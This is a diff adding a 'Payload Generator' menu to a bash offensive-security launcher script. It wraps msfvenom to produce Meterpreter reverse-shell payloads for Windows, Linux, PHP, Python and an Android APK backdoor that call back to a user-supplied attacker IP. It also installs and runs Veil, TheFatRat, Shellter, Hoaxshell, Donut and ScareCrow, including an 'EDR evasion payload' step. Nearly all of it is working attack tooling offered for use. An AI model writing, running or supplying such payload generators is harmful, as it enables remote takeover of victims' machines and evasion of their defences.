@@ -1307,7 +1307,303 @@ credential_menu(){
     done
 }
 
+# CHOICE 6: Payload Generator
+payload_menu(){
+    clear
+    display_ascii_info
+    echo -e "${BRIGHT_RED}"
+    echo ""
+    echo ""
+    echo "      ╔══════════════════════════════════════════════╗"
+    echo "      ║${RESET}       ${BRIGHT_BLUE}▓▒░  PAYLOAD GENERATOR  ░▒▓${BRIGHT_RED}         ║"
+    echo "      ╚══════════════════════════════════════════════╝"
+    echo -e "${RESET}"
+    
+    echo -e "       System: ${BRIGHT_BLUE}OPERATIONAL${RESET}  ${BRIGHT_RED}✞${RESET}  Security Level: ${BRIGHT_RED}MAXIMUM${RESET}"
+    echo ""
+    echo -e "        ${BRIGHT_BLUE}┌─                                      ─┐${RESET}"
+    echo ""
 
+    local options=(
+        "1) MSFVenom"
+        "2) Veil-Framework"
+        "3) TheFatRat"
+        "4) Shellter"
+        "5) Hoaxshell"
+        "6) Donut"
+        "7) ScareCrow"
+        "99) Back to Main Menu"
+    )
+    
+    for option in "${options[@]}"; do
+        echo -e "            ${RED}[${option%%)*}]${RESET} ${BRIGHT_BLUE}${option#*)}${RESET}"
+    done
+    
+    echo ""
+    echo -e "        ${BRIGHT_BLUE}└──                                    ──┘${RESET}"
+    echo ""
+    
+    while true; do
+        read -rp " ${BRIGHT_BLUE}user@nexus:~${RESET}${BRIGHT_RED}\$${RESET} " sub_choice
+        
+        case $sub_choice in
+            1)
+                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking MSFVenom...\n"
+                if ! command -v msfvenom &> /dev/null; then
+                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}MSFVenom not found. Install Metasploit first.${RESET}"
+                    read -rp "Do you want to install Metasploit? (yes/no): " install_choice
+                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
+                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing Metasploit Framework...\n"
+                        curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+                        chmod 755 msfinstall
+                        sudo ./msfinstall
+                        rm msfinstall
+                    fi
+                fi
+                if command -v msfvenom &> /dev/null; then
+                    echo -e "\n${BRIGHT_RED}[◆]${RESET} MSFVenom Payload Generator:\n"
+                    echo -e "${BRIGHT_BLUE}[1]${RESET} Windows Reverse Shell (EXE)"
+                    echo -e "${BRIGHT_BLUE}[2]${RESET} Linux Reverse Shell (ELF)"
+                    echo -e "${BRIGHT_BLUE}[3]${RESET} PHP Reverse Shell"
+                    echo -e "${BRIGHT_BLUE}[4]${RESET} Python Reverse Shell"
+                    echo -e "${BRIGHT_BLUE}[5]${RESET} Android APK Backdoor"
+                    echo -e "${BRIGHT_BLUE}[6]${RESET} List all payloads"
+                    echo -e "${BRIGHT_BLUE}[7]${RESET} Custom payload"
+                    read -rp "Select option: " msf_choice
+                    case $msf_choice in
+                        1)
+                            read -rp "Enter LHOST (your IP): " lhost
+                            read -rp "Enter LPORT (default 4444): " lport
+                            lport=${lport:-4444}
+                            read -rp "Output filename (default: payload.exe): " output
+                            output=${output:-payload.exe}
+                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Generating Windows reverse shell...\n"
+                            msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$output"
+                            echo -e "\n${BRIGHT_GREEN}[✓]${RESET} Payload saved to: $output\n"
+                            ;;
+                        2)
+                            read -rp "Enter LHOST (your IP): " lhost
+                            read -rp "Enter LPORT (default 4444): " lport
+                            lport=${lport:-4444}
+                            read -rp "Output filename (default: payload.elf): " output
+                            output=${output:-payload.elf}
+                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Generating Linux reverse shell...\n"
+                            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o "$output"
+                            chmod +x "$output"
+                            echo -e "\n${BRIGHT_GREEN}[✓]${RESET} Payload saved to: $output\n"
+                            ;;
+                        3)
+                            read -rp "Enter LHOST (your IP): " lhost
+                            read -rp "Enter LPORT (default 4444): " lport
+                            lport=${lport:-4444}
+                            read -rp "Output filename (default: payload.php): " output
+                            output=${output:-payload.php}
+                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Generating PHP reverse shell...\n"
+                            msfvenom -p php/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw -o "$output"
+                            echo -e "\n${BRIGHT_GREEN}[✓]${RESET} Payload saved to: $output\n"
+                            ;;
+                        4)
+                            read -rp "Enter LHOST (your IP): " lhost
+                            read -rp "Enter LPORT (default 4444): " lport
+                            lport=${lport:-4444}
+                            read -rp "Output filename (default: payload.py): " output
+                            output=${output:-payload.py}
+                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Generating Python reverse shell...\n"
+                            msfvenom -p python/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw -o "$output"
+                            echo -e "\n${BRIGHT_GREEN}[✓]${RESET} Payload saved to: $output\n"
+                            ;;
+                        5)
+                            read -rp "Enter LHOST (your IP): " lhost
+                            read -rp "Enter LPORT (default 4444): " lport
+                            lport=${lport:-4444}
+                            read -rp "Output filename (default: payload.apk): " output
+                            output=${output:-payload.apk}
+                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Generating Android APK backdoor...\n"
+                            msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o "$output"
+                            echo -e "\n${BRIGHT_GREEN}[✓]${RESET} Payload saved to: $output\n"
+                            ;;
+                        6)
+                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Available payloads:\n"
+                            msfvenom --list payloads | less
+                            ;;
+                        7)
+                            read -rp "Enter payload (e.g., windows/shell/reverse_tcp): " payload
+                            read -rp "Enter LHOST: " lhost
+                            read -rp "Enter LPORT: " lport
+                            read -rp "Enter format (exe, elf, raw, etc.): " format
+                            read -rp "Output filename: " output
+                            echo -e "\n${BRIGHT_RED}[◆]${RESET} Generating custom payload...\n"
+                            msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f "$format" -o "$output"
+                            echo -e "\n${BRIGHT_GREEN}[✓]${RESET} Payload saved to: $output\n"
+                            ;;
+                    esac
+                fi
+                ;;
+            2)
+                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Veil-Framework...\n"
+                if [ ! -d ~/tools/Veil ]; then
+                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Veil is not installed.${RESET}"
+                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
+                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
+                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning Veil from GitHub...\n"
+                        mkdir -p ~/tools
+                        git clone https://github.com/Veil-Framework/Veil.git ~/tools/Veil
+                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing Veil (this may take a while)...\n"
+                        cd ~/tools/Veil
+                        sudo ./config/setup.sh --force --silent
+                        cd -
+                    fi
+                fi
+                if [ -d ~/tools/Veil ]; then
+                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Launching Veil-Evasion...\n"
+                    cd ~/tools/Veil
+                    ./Veil.py
+                    cd -
+                fi
+                ;;
+            3)
+                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking TheFatRat...\n"
+                if [ ! -d ~/tools/TheFatRat ]; then
+                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}TheFatRat is not installed.${RESET}"
+                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
+                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
+                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning TheFatRat from GitHub...\n"
+                        mkdir -p ~/tools
+                        git clone https://github.com/screetsec/TheFatRat.git ~/tools/TheFatRat
+                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing TheFatRat...\n"
+                        cd ~/tools/TheFatRat
+                        chmod +x setup.sh
+                        sudo ./setup.sh
+                        cd -
+                    fi
+                fi
+                if [ -d ~/tools/TheFatRat ]; then
+                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Launching TheFatRat...\n"
+                    cd ~/tools/TheFatRat
+                    ./fatrat
+                    cd -
+                fi
+                ;;
+            4)
+                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Shellter...\n"
+                if ! command -v shellter &> /dev/null; then
+                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Shellter is not installed.${RESET}"
+                    read -rp "Would you like to install it? (yes/no): " install_choice
+                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
+                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing Shellter...\n"
+                        sudo apt-get update
+                        sudo apt-get install -y shellter
+                    fi
+                fi
+                if command -v shellter &> /dev/null; then
+                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Shellter PE Injection:\n"
+                    echo -e "${BRIGHT_BLUE}Note: Shellter requires Windows PE files${RESET}"
+                    echo -e "${BRIGHT_BLUE}Run 'shellter' and follow interactive prompts${RESET}\n"
+                    read -rp "Launch Shellter? (yes/no): " launch
+                    if [[ $launch =~ ^[Yy]([Ee][Ss])?$ ]]; then
+                        shellter
+                    fi
+                fi
+                ;;
+            5)
+                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Hoaxshell...\n"
+                if [ ! -d ~/tools/hoaxshell ]; then
+                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Hoaxshell is not installed.${RESET}"
+                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
+                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
+                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning Hoaxshell from GitHub...\n"
+                        mkdir -p ~/tools
+                        git clone https://github.com/t3l3machus/hoaxshell.git ~/tools/hoaxshell
+                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing dependencies...\n"
+                        pip3 install -r ~/tools/hoaxshell/requirements.txt
+                    fi
+                fi
+                if [ -d ~/tools/hoaxshell ]; then
+                    read -rp "Enter your IP (LHOST): " lhost
+                    read -rp "Enter port (default 8080): " lport
+                    lport=${lport:-8080}
+                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Starting Hoaxshell server...\n"
+                    echo -e "${BRIGHT_BLUE}Server will generate PowerShell payload${RESET}\n"
+                    cd ~/tools/hoaxshell
+                    python3 hoaxshell.py -s "$lhost" -p "$lport"
+                    cd -
+                fi
+                ;;
+            6)
+                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking Donut...\n"
+                if ! command -v donut &> /dev/null && [ ! -f ~/tools/donut/donut ]; then
+                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Donut is not installed.${RESET}"
+                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
+                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
+                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Cloning Donut from GitHub...\n"
+                        mkdir -p ~/tools
+                        git clone https://github.com/TheWover/donut.git ~/tools/donut
+                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Building Donut...\n"
+                        cd ~/tools/donut
+                        make
+                        sudo make install
+                        cd -
+                    fi
+                fi
+                if command -v donut &> /dev/null || [ -f ~/tools/donut/donut ]; then
+                    DONUT_CMD=$(command -v donut || echo ~/tools/donut/donut)
+                    read -rp "Enter .NET EXE/DLL file path: " input_file
+                    read -rp "Output shellcode file (default: payload.bin): " output
+                    output=${output:-payload.bin}
+                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Converting to shellcode...\n"
+                    $DONUT_CMD -f "$input_file" -o "$output"
+                    echo -e "\n${BRIGHT_GREEN}[✓]${RESET} Shellcode saved to: $output\n"
+                fi
+                ;;
+            7)
+                echo -e "\n${BRIGHT_RED}[◆]${RESET} Checking ScareCrow...\n"
+                if ! command -v ScareCrow &> /dev/null; then
+                    echo -e "${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}ScareCrow is not installed.${RESET}"
+                    read -rp "Would you like to install it from GitHub? (yes/no): " install_choice
+                    if [[ $install_choice =~ ^[Yy]([Ee][Ss])?$ ]]; then
+                        echo -e "\n${BRIGHT_RED}[◆]${RESET} Installing ScareCrow...\n"
+                        if ! command -v go &> /dev/null; then
+                            echo -e "${BRIGHT_RED}[!]${RESET} Go is required. Installing...\n"
+                            sudo apt-get install -y golang-go
+                        fi
+                        go install github.com/optiv/ScareCrow@latest
+                        export PATH=$PATH:~/go/bin
+                    fi
+                fi
+                if command -v ScareCrow &> /dev/null || [ -f ~/go/bin/ScareCrow ]; then
+                    SCARECROW_CMD=$(command -v ScareCrow || echo ~/go/bin/ScareCrow)
+                    read -rp "Enter shellcode file path: " shellcode
+                    read -rp "Enter domain for signing (optional): " domain
+                    read -rp "Output filename (default: payload.exe): " output
+                    output=${output:-payload.exe}
+                    echo -e "\n${BRIGHT_RED}[◆]${RESET} Generating EDR evasion payload...\n"
+                    if [ -z "$domain" ]; then
+                        $SCARECROW_CMD -I "$shellcode" -O "$output"
+                    else
+                        $SCARECROW_CMD -I "$shellcode" -domain "$domain" -O "$output"
+                    fi
+                    echo -e "\n${BRIGHT_GREEN}[✓]${RESET} Payload saved to: $output\n"
+                fi
+                ;;
+            99)
+                echo -e "\n${BRIGHT_RED}[◆]${RESET} Returning to Main Menu...\n"
+                sleep 1
+                clear
+                return
+                ;;
+            *)
+                echo -e "\n${BRIGHT_RED}[!]${RESET} ${BRIGHT_BLUE}Invalid selection${RESET}\n"
+                sleep 1
+                clear
+                ;;
+        esac
+        
+        echo ""
+        read -rp "${BRIGHT_BLUE}Press Enter to continue...${RESET}"
+        clear
+        return
+    done
+}
 
 
 #MAIN SELECTION HANDLER
@@ -1341,6 +1637,7 @@ handle_selection() {
             ;;
         6)
             echo -e "\n${BRIGHT_RED}[◆]${RESET} Generating PAYLOAD...\n"
+            payload_menu
             sleep 1
             ;;
         7)
